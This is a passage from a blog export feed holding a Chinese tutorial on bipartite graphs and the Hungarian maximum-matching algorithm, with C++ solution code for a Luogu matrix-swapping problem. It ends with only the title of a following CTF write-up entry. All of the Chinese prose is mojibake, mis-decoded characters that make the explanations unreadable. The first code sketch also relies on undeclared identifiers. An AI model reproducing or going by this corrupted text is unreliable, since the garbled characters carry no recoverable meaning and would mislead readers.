alt="1"></p><p>åˆ¤æ–­äºŒåˆ†å›¾å¯ä»¥ç”¨å®ƒçš„æ€§è´¨ï¼Œæ˜¾è€Œæ˜“è§çš„æ€§è´¨æ˜¯ä»€ä¹ˆï¼šè¾¹è¿æ¥çš„ä¸¤ä¸ªç‚¹ä¸€å®šå±äºä¸åŒé›†åˆã€‚ç”¨åˆšåˆšé‚£ä¸ªä¾‹å­å†å»è®²çš„è¯å°±æ˜¯ï¼šæ²¡æœ‰åŒçš„æƒ…å†µä¸‹ï¼Œå–œæ¬¢ç”·å­©çš„ä¸€å®šéƒ½æ˜¯å¥³å­©ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬åˆ’åˆ†å°±æ˜¯ä»¥ç”·å­©å¥³å­©ä½œä¸ºä¾æ®åˆ’åˆ†çš„ï¼Œæ¥ç€å¾€ä¸‹æ¨åˆå¯ä»¥å¾—åˆ°ï¼šå–œæ¬¢<strong>å–œæ¬¢ç”·å­©çš„äºº</strong>çš„äººä¸€å®šä¹Ÿæ˜¯ç”·å­©ã€‚è¿™é‡Œæˆ‘ä»¬ä»1å¼€å§‹ï¼Œå‡è®¾1ä¸ºç”·ï¼Œé‚£ä¹ˆ5ï¼Œ7å¿…ä¸ºå¥³ï¼Œ2ï¼Œ8ï¼Œ3å¿…ä¸ºç”·ï¼Œ6ï¼Œ4å¿…ä¸ºå¥³ã€‚</p><p>æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°åˆ’åˆ†ï¼š<code>&#123;&#123;1,2,3,8&#125;,&#123;4,5,6,7&#125;&#125;</code>ã€‚é‚£ä¹ˆæˆ‘ä»¬ç¨å¾®ç”»çš„æ˜æ˜¾ä¸€ç‚¹ï¼Œå°†ä¸¤ä¸ªåˆ’åˆ†ç‹¬ç«‹ä¸ºä¸¤æ’ï¼Œå¾—åˆ°äº†ä»¥ä¸‹å›¾ã€‚</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/2.png" alt="2"></p><p>ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½ä¼šæŠŠäºŒåˆ†å›¾åŒ–æˆè¿™ç§å½¢å¼ï¼Œå¯ä»¥å¾ˆæ¸…æ¥šçš„å‘ç°ï¼ŒåŒä¸€æ’ä¹‹é—´çš„ç‚¹æ²¡æœ‰è¿çº¿ã€‚é‚£ä¹ˆä½ ç°åœ¨ä¸€å®šå¯¹äºŒåˆ†å›¾æœ‰äº†ä¸€ä¸ªè¾ƒä¸ºæ¸…æ¥šçš„è®¤è¯†ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šç–‘æƒ‘ï¼Œè¿™æ ·çš„æ•°æ®ç»“æ„èƒ½ç”¨æ¥å¤„ç†ä»€ä¹ˆæ ·çš„é—®é¢˜å‘¢ï¼Ÿé‚£ä¹ˆå°±æ¶‰åŠåˆ°æˆ‘ä»¬æ¥ä¸‹æ¥è®²çš„æ¦‚å¿µäº†ã€‚</p><h2 id="ä¸€äº›æ¦‚å¿µ"><a href="#ä¸€äº›æ¦‚å¿µ" class="headerlink" title="ä¸€äº›æ¦‚å¿µ"></a>ä¸€äº›æ¦‚å¿µ</h2><ol><li>åŒ¹é…(matching)ï¼šåŒ¹é…å…¶å®å°±æ˜¯ä¸€ä¸ªè¾¹çš„é›†åˆï¼Œä»»æ„ä¸¤æ¡å±äºåŒ¹é…çš„è¾¹éƒ½æ²¡æœ‰å…¬å…±é¡¶ç‚¹ï¼Œé‚£ä¹ˆè¿™ä¸ªé›†åˆå°±å«åšè¿™ä¸ªå›¾çš„ä¸€ä¸ªåŒ¹é…ã€‚</li><li>åŒ¹é…ç‚¹ï¼šå¦‚æœè¿™ä¸ªç‚¹å­˜åœ¨äºè¿™ä¸ªåŒ¹é…çš„ä»»æ„ä¸€æ¡è¾¹ä¸Šï¼Œé‚£ä¹ˆè¿™ä¸ªç‚¹å°±æ˜¯ä¸€ä¸ªåŒ¹é…ç‚¹ã€‚</li><li>åŒ¹é…è¾¹ï¼šå¦‚æœè¿™ä¸ªè¾¹å±äºè¿™ä¸ªåŒ¹é…ï¼Œé‚£ä¹ˆè¿™å°±æ˜¯ä¸€ä¸ªåŒ¹é…è¾¹ã€‚</li><li>éåŒ¹é…ç‚¹ï¼šä¸åŒ¹é…ç‚¹ç›¸å¯¹</li><li>éåŒ¹é…è¾¹ï¼šä¸åŒ¹é…è¾¹ç›¸å¯¹</li><li>æœ€å¤§åŒ¹é…ï¼šåœ¨æ‰€æœ‰åŒ¹é…ä¸­ï¼Œæ‰€å«è¾¹æ•°é‡æœ€å¤šçš„ç§°ä¸ºæœ€å¤§åŒ¹é…ã€‚</li><li>å®Œç¾åŒ¹é…ï¼šå¦‚æœä¸€ä¸ªåŒ¹é…ä¸­çš„æ‰€æœ‰è¾¹åŒ…å«äº†ä¸€ä¸ªå›¾çš„æ‰€æœ‰ç‚¹ï¼Œå³ï¼Œä¸€ä¸ªå›¾å½“ä¸­æ‰€æœ‰çš„ç‚¹éƒ½ä¸ºåŒ¹é…ç‚¹æ—¶ï¼Œè¿™ä¸ªåŒ¹é…ç§°ä¸ºå®Œç¾åŒ¹é…ï¼Œå¹¶éæ‰€æœ‰çš„å›¾éƒ½å«æœ‰å®Œç¾åŒ¹é…ï¼Œå®Œç¾åŒ¹é…ä¸€å®šæ˜¯æœ€å¤§åŒ¹é…ã€‚</li></ol><h3 id="å®é™…åº”ç”¨"><a href="#å®é™…åº”ç”¨" class="headerlink" title="å®é™…åº”ç”¨"></a>å®é™…åº”ç”¨</h3><p>æ¯”å¦‚è¿˜æ˜¯ä¸Šé¢è¿™ä¸ªå›¾ï¼Œå‡è®¾å®ƒä»¬å°±æ˜¯å››ç”·å››å¥³ï¼Œæˆ‘ä»¬è¦æ€æ ·åšï¼Œæ‰èƒ½å°½å¯èƒ½ä¿è¯å®ƒä»¬éƒ½å’Œè‡ªå·±å–œæ¬¢çš„äººå‡‘æˆä¸€å¯¹å‘¢ï¼Ÿè¿™å®é™…ä¸Šå°±æ˜¯è¦æ±‚äºŒåˆ†å›¾çš„æœ€å¤§åŒ¹é…äº†ï¼Œæœ€å¤§åŒ¹é…æˆ‘ä»¬ä¸€èˆ¬æ˜¯ç”¨åŒˆç‰™åˆ©ç®—æ³•ï¼Œå¯¹äºåŒˆç‰™åˆ©ç®—æ³•ï¼Œæˆ‘ä»¬éœ€è¦å†è¡¥å……ä¸€ç‚¹æ¦‚å¿µã€‚</p><ol><li>äº¤æ›¿è·¯ï¼šå¦‚æœä»ä¸€ä¸ªéåŒ¹é…ç‚¹å‡ºå‘ï¼Œä¾æ¬¡ç»è¿‡åŒ¹é…è¾¹ï¼ŒéåŒ¹é…è¾¹ï¼ŒåŒ¹é…è¾¹ï¼ŒéåŒ¹é…è¾¹â€¦â€¦å½¢æˆçš„è·¯å¾„å°±å«äº¤æ›¿è·¯ã€‚</li><li>å¢å¹¿è·¯ï¼šå¦‚æœäº¤æ›¿è·¯çš„ç»ˆç‚¹ä¸ºä¸€ä¸ªéåŒ¹é…ç‚¹ï¼Œé‚£ä¹ˆè¿™æ¡äº¤æ›¿è·¯æˆ‘ä»¬åˆå«å¢å¹¿è·¯ã€‚</li></ol><p>å¦‚ä¸‹å›¾</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/3.png" alt="3"></p><p>çº¢è‰²ç‚¹å’Œçº¢è‰²è¾¹ä¸ºåŒ¹é…ç‚¹å’ŒåŒ¹é…è¾¹ï¼Œè¿™æ˜¯ä¸€æ¡å¢å¹¿è·¯ã€‚</p><p>å¢å¹¿è·¯çš„æ€§è´¨å°±æ˜¯éåŒ¹é…è¾¹ä¼šæ¯”åŒ¹é…è¾¹å¤šä¸€æ¡ã€‚å¦‚æœæˆ‘ä»¬æŠŠåŒ¹é…è¾¹å’ŒéåŒ¹é…è¾¹äº¤æ¢é¡ºåºï¼Œé‚£ä¹ˆå°†ä¼šå¾—åˆ°</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/4.png" alt="4"></p><p>å¯ä»¥åˆ°ç›¸æ¯”ä¹‹å‰å¤šäº†ä¸€ä¸ªåŒ¹é…è¾¹å’Œä¸¤ä¸ªåŒ¹é…ç‚¹ã€‚ä½†æ˜¯åŒ¹é…é¡ºåºå®Œå…¨ä¸ä¸€æ ·äº†ï¼ŒåŸæ¥æ˜¯2ï¼Œ3åŒ¹é…ï¼Œ4ï¼Œ5åŒ¹é…ï¼Œç°åœ¨2ï¼Œ3å’Œ4ï¼Œ5éƒ½ä¸åœ¨åŒä¸€æ¡åŒ¹é…è¾¹ä¸Šã€‚</p><p>åŒˆç‰™åˆ©ç®—æ³•çš„æœ¬è´¨å°±æ˜¯ä¸åœå¯»æ‰¾å¢å¹¿è·¯ï¼Œå¢åŠ åŒ¹é…æ•°ç›®çš„ã€‚æˆ‘ä»¬å…ˆä¸è€ƒè™‘åŒˆç‰™åˆ©ç®—æ³•çš„ä»£ç ï¼Œå…ˆå¾’æ‰‹åšä¸€éã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦åŒ¹é…çš„ç‚¹åªæœ‰ä¸€è¾¹ï¼Œå¦ä¸€è¾¹æ˜¯è¢«åŒ¹é…çš„ã€‚</p><p>å¦‚æœ€å¼€å§‹é‚£ä¸ªå›¾ï¼Œ</p><p>ä»1å¼€å§‹ï¼Œéå†è¾¹ï¼Œå…ˆçœ‹1ï¼Œ5ï¼Œå‘ç°5æœªè¢«åŒ¹é…ï¼Œåˆ™ç›´æ¥åŒ¹é…ï¼Œç»“æŸã€‚</p><p>é‚£ä¹ˆç°åœ¨çš„å›¾æ˜¯è¿™æ ·çš„ã€‚</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/5.png" alt="5"></p><p>ä»2å¼€å§‹ï¼Œ2æœªè¢«åŒ¹é…ï¼Œåˆ™å¯»æ‰¾ä¸å®ƒç›¸è¿çš„è¾¹ï¼Œæ‰¾åˆ°(2,5)ï¼Œä½†æ˜¯å‘ç°5å·²ç»è¢«åŒ¹é…äº†ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦ç”¨åˆ°å¯»æ‰¾å¢å¹¿è·¯çš„æ€ç»´äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æ²¿ç€åŒ¹é…è¾¹æœå¯»ï¼Œå°±æ‰¾åˆ°äº†1ï¼Œç„¶åä»1å¼€å§‹æ‰¾ç›¸è¿çš„è¾¹ï¼Œå› ä¸ºä¸èƒ½åå¤æ¨ªè·³ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½é€‰æ‹©7ï¼Œå‘ç°7æ²¡è¢«åŒ¹é…ï¼Œå› æ­¤2-5-1-7æ„æˆå¢å¹¿è·¯ï¼Œæ‰¾åˆ°å¢å¹¿è·¯ä¹‹åä»£è¡¨é¦–ä½ä¸¤ä¸ªç‚¹å‚ä¸è¿›äº†åŒ¹é…ã€‚ç„¶åäº¤æ¢åŒ¹é…è¾¹ä¸éåŒ¹é…è¾¹ã€‚æˆäº†è¿™æ ·</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/6.png" alt="6"></p><p>è¿™é‡Œæˆ‘ä»¬ä¸è€ƒè™‘æœ€å¥½çš„æƒ…å†µï¼Œå› ä¸ºæˆ‘ä»¬è‡ªå·±å¾ˆæ¸…æ¥š3ï¼Œ6åŒ¹é…ï¼Œ4ï¼Œ8åŒ¹é…ç›´æ¥å°±å®Œç»“æ’’èŠ±äº†ã€‚ä½†æ˜¯è®¡ç®—æœºä¸ä¸€å®šæŒ‰ç…§è¿™æ ·çš„æ–¹å¼å»éå†ï¼Œä½ è¦ä¿è¯å…ˆåé¡ºåºä¸å½±å“æœ€ç»ˆç»“æœï¼Œå³å°±ç®—ä½ é€‰æ‹©5ï¼Œæœ€ç»ˆç®—å‡ºæ¥çš„æœ€å¤§åŒ¹é…åº”å½“ä¹Ÿæ˜¯4ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬é€‰5ï¼Œå‘ç°5è¢«åŒ¹é…äº†ï¼Œäºæ˜¯æ‰¾åˆ°2ï¼Œä½†æ˜¯2ä¹‹åå†ä¹Ÿæ‰¾ä¸åˆ°è·¯å¾„äº†ï¼Œå› æ­¤(3,5)æ–¹å‘ä¸Šçš„å¢å¹¿è·¯å¯»æ‰¾å¤±è´¥ï¼Œæ‰€ä»¥å°±ä¼šæ‰¾(3,6)ï¼Œ(3,6)ç›´æ¥åŒ¹é…ï¼Œæˆ‘ä»¬çœ‹çœ‹æœ€åè¿™ä¸ª8ä¼šæ€ä¹ˆæ ·å‘¢ï¼Œæˆ‘ä»¬å‡è®¾ä¹Ÿæ˜¯å…ˆæ‰¾åˆ°äº†7ï¼Œ7ä¼šæ‰¾åˆ°1ï¼Œ1ä¼šæ‰¾åˆ°5ï¼Œ5æ‰¾åˆ°2ï¼Œå‘ç°2æ‰¾ä¸åˆ°å¢å¹¿è·¯äº†ï¼Œè¿”å›å¤±è´¥ã€‚æ‰€ä»¥æœ€ç»ˆé€‰æ‹©äº†(8,4)ã€‚é‚£ä¹ˆè¿™æ ·ä¸€æ•´ä¸ªå°±æ˜¯åŒˆç‰™åˆ©ç®—æ³•äº†ã€‚</p><p>è¿™é‡Œç”¨Cä»£ç å¤§æ¦‚å†™ä¸€ä¸‹ï¼Œå‡è®¾å­˜å›¾é‡‡ç”¨é“¾å¼å‰å‘æ˜Ÿã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[MAX_EDGE];</span><br><span class="line"><span class="keyword">int</span> match[MAX_NODE],check[MAX_NODE],root[MAX_NODE];</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;s;<span class="comment">//å­˜å‚¨ä¸€è¾¹çš„ç‚¹é›†</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(!check[v])&#123;</span><br><span class="line">            check[v]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(match[v]==<span class="number">-1</span>||<span class="built_in">dfs</span>(match[v]))&#123;</span><br><span class="line">                match[u]=v;</span><br><span class="line">                match[v]=u;</span><br><span class="line">                check[v]=<span class="literal">false</span>; </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xyl</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(match[s[i]]==<span class="number">-1</span>)&#123;</span><br><span class="line">            check[s[i]]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">dfs</span>(s[i]))ans++;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><p><a href="https://www.luogu.com.cn/problem/P1129">æ´›è°·P1129</a></p><p>å° Q æ˜¯ä¸€ä¸ªéå¸¸èªæ˜çš„å­©å­ï¼Œé™¤äº†å›½é™…è±¡æ£‹ï¼Œä»–è¿˜å¾ˆå–œæ¬¢ç©ä¸€ä¸ªç”µè„‘ç›Šæ™ºæ¸¸æˆâ€•â€•çŸ©é˜µæ¸¸æˆã€‚çŸ©é˜µæ¸¸æˆåœ¨ä¸€ä¸ª n \times n<em>n</em>Ã—<em>n</em> é»‘ç™½æ–¹é˜µè¿›è¡Œï¼ˆå¦‚åŒå›½é™…è±¡æ£‹ä¸€èˆ¬ï¼Œåªæ˜¯é¢œè‰²æ˜¯éšæ„çš„ï¼‰ã€‚æ¯æ¬¡å¯ä»¥å¯¹è¯¥çŸ©é˜µè¿›è¡Œä¸¤ç§æ“ä½œï¼š</p><ul><li>è¡Œäº¤æ¢æ“ä½œï¼šé€‰æ‹©çŸ©é˜µçš„ä»»æ„ä¸¤è¡Œï¼Œäº¤æ¢è¿™ä¸¤è¡Œï¼ˆå³äº¤æ¢å¯¹åº”æ ¼å­çš„é¢œè‰²ï¼‰ã€‚</li><li>åˆ—äº¤æ¢æ“ä½œï¼šé€‰æ‹©çŸ©é˜µçš„ä»»æ„ä¸¤åˆ—ï¼Œäº¤æ¢è¿™ä¸¤åˆ—ï¼ˆå³äº¤æ¢å¯¹åº”æ ¼å­çš„é¢œè‰²ï¼‰ã€‚</li></ul><p>æ¸¸æˆçš„ç›®æ ‡ï¼Œå³é€šè¿‡è‹¥å¹²æ¬¡æ“ä½œï¼Œä½¿å¾—æ–¹é˜µçš„ä¸»å¯¹è§’çº¿(å·¦ä¸Šè§’åˆ°å³ä¸‹è§’çš„è¿çº¿)ä¸Šçš„æ ¼å­å‡ä¸ºé»‘è‰²ã€‚</p><p>å¯¹äºæŸäº›å…³å¡ï¼Œå° Q ç™¾æ€ä¸å¾—å…¶è§£ï¼Œä»¥è‡´ä»–å¼€å§‹æ€€ç–‘è¿™äº›å…³å¡æ˜¯ä¸æ˜¯æ ¹æœ¬å°±æ˜¯æ— è§£çš„ï¼äºæ˜¯å° Q å†³å®šå†™ä¸€ä¸ªç¨‹åºæ¥åˆ¤æ–­è¿™äº›å…³å¡æ˜¯å¦æœ‰è§£ã€‚</p><p>é¢˜æ„ç®€å•æ˜äº†å°±æ˜¯ç»™ä¸€ä¸ª01çŸ©é˜µï¼Œé—®ä½ èƒ½ä¸èƒ½é€šè¿‡è¡Œäº¤æ¢ä¸åˆ—äº¤æ¢å°†ä¸»å¯¹è§’çº¿çš„å…ƒç´ éƒ½å˜æˆ1ã€‚</p><p>é‚£ä¹ˆå…¶å®å°±æ˜¯æ¯ä¸€è¡Œæ‰¾åˆ°ä¸€ä¸ª1ï¼Œä½¿å¾—æ¯ä¸ª1å¤„äºä¸åŒçš„åˆ—ã€‚åªè¦æ‰¾åˆ°ï¼Œé‚£ä¹ˆç»è¿‡è‹¥å¹²æ¬¡äº¤æ¢ä¸€å®šèƒ½ä½¿ä¸»å¯¹è§’çº¿å…ƒç´ éƒ½ä¸º1ã€‚å¦‚æœç¬¬ä¸€è¡Œçš„ç¬¬ä¸‰åˆ—å­˜åœ¨ä¸€ä¸ª1ï¼Œé‚£ä¹ˆå°±è®©1å’Œ3ç›¸è¿ã€‚å½“ç„¶å› ä¸ºè¿™é‡Œçš„3ä¸èƒ½å’Œç¬¬ä¸‰è¡Œæ··æ·†ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©åˆ—æ•°+nä½œä¸ºäºŒåˆ†å›¾çš„å¦ä¸€ä¸ªç‚¹é›†ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©è¡Œåˆ—éƒ½åŒ¹é…é‚£å°±å®Œæˆäº†ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[<span class="number">100000</span>];</span><br><span class="line"><span class="keyword">int</span> cnt,n,root[<span class="number">501</span>],check[<span class="number">500</span>],match[<span class="number">500</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;%d %d\n&quot;,x,y);</span></span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(!check[v])&#123;</span><br><span class="line">            check[v]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(match[v]==<span class="number">-1</span>||<span class="built_in">dfs</span>(match[v]))&#123;</span><br><span class="line">                match[u]=v;</span><br><span class="line">                match[v]=u;</span><br><span class="line">                check[v]=<span class="literal">false</span>; </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xyl</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(match[i]==<span class="number">-1</span>)&#123;</span><br><span class="line">            check[i]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">dfs</span>(i))ans++;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">memset</span>(root,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(root));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2</span>*n;i++)match[i]=<span class="number">-1</span>;</span><br><span class="line">    cnt=<span class="number">0</span>;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> x;</span><br><span class="line">            cin&gt;&gt;x;</span><br><span class="line">            <span class="keyword">if</span>(x==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">add</span>(i,j+n);</span><br><span class="line">                <span class="built_in">add</span>(j+n,i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">xyl</span>()==n)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¢«å¡äº†æœ‰ç‚¹ä¹…ï¼Œæœ€åå‘ç°æ˜¯æ•°ç»„è¶Šç•Œï¼Œåœ¨ä½¿ç”¨å‰å‘æ˜Ÿå­˜æ— å‘å›¾çš„æ—¶å€™ä¸€å®šè¦è®°å¾—å¼€ä¸¤å€å†…å­˜ï¼Œä¸ç„¶å†™è¶Šç•Œäº†å¾ˆéš¾è¯´é”™è¯¯åœ¨å“ªã€‚</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/7.png" alt="7"></p><p>è¡€æ·‹æ·‹çš„æ•™è®­ï¼Œå¹¶ä¸”å¤±è´¥çš„ä¿©æµ‹è¯•ç‚¹æ²¡æœ‰æŠ¥é”™reï¼Œè€Œæ˜¯wrong answerã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> äºŒåˆ†å›¾ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>actf_2019_onerepeater writeup</title>
      <link href="/2022/02/02/actf_2019_onerepeater%20writeup/"/>
      <url>/2022/02/02/actf_2019_onerepeater%20writeup/</url>
      
